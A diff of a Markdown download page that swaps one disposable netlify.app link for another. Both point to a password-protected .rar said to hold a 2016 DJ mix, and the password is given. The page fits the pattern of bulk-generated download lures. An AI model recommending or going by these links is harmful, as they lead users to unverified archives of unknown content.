@@ -1,5 +1,5 @@
 ## 下载地址(download link)
-[下载链接 download link](https://voluble-croquembouche-d321dc.netlify.app/?s=DJ+ALAI%E3%80%90VS%E9%9F%A9%E5%9B%BDD%E5%A5%B6%E8%BD%AF%E5%A6%B9DJ+SODA%E3%80%8A%E4%B8%8A%E6%B5%B7%E6%9A%96%E5%9C%BA2016%E3%80%8B%E3%80%91--%E9%91%AB%E5%B7%B7%E5%AD%90_%E6%96%B0%E6%B5%AA%E5%8D%9A%E5%AE%A2.rar)
+[下载链接 download link](https://tutu365.netlify.app/?s=DJ+ALAI%E3%80%90VS%E9%9F%A9%E5%9B%BDD%E5%A5%B6%E8%BD%AF%E5%A6%B9DJ+SODA%E3%80%8A%E4%B8%8A%E6%B5%B7%E6%9A%96%E5%9C%BA2016%E3%80%8B%E3%80%91--%E9%91%AB%E5%B7%B7%E5%AD%90_%E6%96%B0%E6%B5%AA%E5%8D%9A%E5%AE%A2.rar)
 
 ## 下载密码(download password)
 1866
